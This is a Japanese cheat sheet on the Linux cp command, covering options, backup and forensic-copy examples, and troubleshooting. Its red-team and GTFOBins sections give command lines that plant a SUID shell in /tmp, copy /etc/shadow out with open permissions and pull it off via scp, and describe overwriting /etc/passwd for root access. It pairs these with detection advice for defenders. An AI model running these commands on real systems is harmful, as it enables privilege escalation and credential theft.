# Command - Linux - cp - ファイルやディレクトリをコピーする

## 概要
`cp` は、ファイルやディレクトリを別の場所へ複製するコマンドです。単なるデータのコピーだけでなく、アクセス権限やタイムスタンプなどの属性（メタデータ）をどのように扱うかが、実務上の重要なポイントになります。
(出自: `coreutils` パッケージに含まれる)



## 類似コマンドと差異
| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `mv` | ファイルを移動（名前変更）する。元ファイルは残らない。 | 移動・リネーム |
| `rsync` | 差分のみを同期する。ネットワーク経由の転送や、属性維持の確実性が高い。 | 大規模同期・バックアップ |
| `scp` | SSH 経由でリモートサーバとファイルをコピーする。 | リモートコピー |
| `dd` | ブロック単位でコピーする。パーティション全体やディスクイメージの複製に使用。 | ディスク複製・フォレンジック |

## よく連携されるコマンド
### シナリオ例: 特定条件に合致するファイルの一括バックアップ (運用視点)
* **目的**: 24時間以内に更新されたログファイルのみを、バックアップディレクトリにコピーする。
* **連携コマンド**: `find`, `xargs`
* **解説**: `find` で対象を抽出し、`cp` でコピーを実行します。
* **コマンド例**:
    ```bash
    # 24時間以内に変更された .log ファイルを /backup へコピー
    find /var/log -name "*.log" -mtime -1 -print0 | xargs -0 -I {} cp {} /backup/
    ```

## オプション説明
| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐️ `-r`, `-R`, `--recursive` | ディレクトリを再帰的にコピーする（ディレクトリのコピーに必須）。 |
| ⭐️ `-i`, `--interactive` | 上書き前に確認プロンプトを表示する。 |
| `-f`, `--force` | 同名のファイルがあれば強制的に上書きする。 |
| **属性・維持** | |
| ⭐️ `-p`, `--preserve` | **所有者、グループ、権限、タイムスタンプを維持**してコピーする。 |
| ⭐️ `-a`, `--archive` | 最強のコピーオプション。`-dR --preserve=all` と同等。バックアップや保全に最適。 |
| `-u`, `--update` | ソースがデスティネーションより新しい場合のみコピーする。 |
| **その他** | |
| `-v`, `--verbose` | 実行内容を詳細に表示する。 |
| `-s`, `--symbolic-link` | ファイルの代わりにシンボリックリンクを作成する。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点
* **タスク**: 設定ファイル編集前の「確実な」バックアップ。
* **組み合わせ**: `cp -p <file> <file>.bak`
* **解説**: 権限や所有者情報を変えずにコピーしておくことで、問題発生時に `cp -p <file>.bak <file>` だけで完全に元に戻せます。
* **例**:
    ```bash
    # 権限を維持したままバックアップ
    sudo cp -p /etc/ssh/sshd_config /etc/ssh/sshd_config.20260222.bak
    ```

### 2. ブルーチーム視点
* **タスク**: 証拠保全（フォレンジック）のためのデータコピー。
* **組み合わせ**: `cp -a`
* **解説**: `-a` (Archive) を使うことで、シンボリックリンクをリンクとして維持し、全ての属性を保持したまま複製できます。証拠のタイムスタンプを変えないために必須です。
* **例**:
    ```bash
    # 侵害された可能性のあるディレクトリをそのまま保全
    sudo cp -a /var/www/html /mnt/evidence_disk/web_evidence_backup
    ```

### 3. レッドチーム視点
* **タスク**: 権限昇格のための SUID バイナリの配置、または特権ファイルの窃取。
* **組み合わせ**: `cp /bin/sh /tmp/sh; chmod +s /tmp/sh`
* **解説**: root 権限を一時的に得た際、将来のアクセスのためにシェルを `/tmp` にコピーして SUID を付与する（永続化の初歩）などに使われます。
* **例**:
    ```bash
    # shadowファイルを読み取り可能な場所へコピーして持ち出す
    sudo cp /etc/shadow /tmp/.p; chmod 666 /tmp/.p
    # (自身の端末から) scp attacker@target:/tmp/.p ./shadow_rip
    ```

## エラーメッセージとトラブルシューティング

1.  **エラーメッセージ例 1**: `cp: omitting directory '...'`
    * **考えられる原因**: ディレクトリをコピーしようとしているが `-r` オプションが抜けている。
    * **解決策**: `cp -r` を使用する。

2.  **エラーメッセージ例 2**: `cp: cannot create regular file '...': Permission denied`
    * **考えられる原因**: 出力先のディレクトリに書き込み権限がない。
    * **解決策**: `sudo` を使用するか、適切な権限を付与する。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例
* **脆弱性**: 不適切な sudo 設定。
* **悪用シナリオ**: 攻撃者が `sudo cp` を実行できる場合、自身の作成した「root ユーザー（パスワードなし）が記述された `/etc/passwd`」を、本物の `/etc/passwd` に上書きすることで、即座に root 奪取が可能です。

### GTFOBins における利用例
`cp` に `sudo` 権限がある場合、任意のファイルを読み取ったり（別の場所へコピーして読む）、重要な設定ファイルを上書きして特権を奪取できます。
* **機能**: `Sudo`, `File Read`, `File Write`
* **コマンド例**:
    ```bash
    # sudo cp を使って特権ファイルを一般ユーザーが読める場所へコピー
    sudo cp /etc/shadow /tmp/shadow && chmod 644 /tmp/shadow
    ```
* **参照**: `https://gtfobins.github.io/gtfobins/cp/`

### 対応策・緩和策 (ブルーチーム視点)
* **Prevention (予防)**: 重要なシステムファイル（`/etc/` 等）への `cp` による書き込みを `auditd` で監視する。
* **Detection (検知)**: `/tmp` や `/dev/shm` などの共有ディレクトリに、システムバイナリ（`sh`, `bash` 等）がコピーされている動きを検知する。

## 注意点・補足
* **上書きの危険性**: 大量にコピーする際は `-n` (no clobber) を使うと、既存のファイルを誤って上書きするのを防げます。
* **属性の消失**: `sudo` なしで `cp -p` を行うと、所有者を自分（一般ユーザー）に変更した状態でコピーされるため注意が必要です。
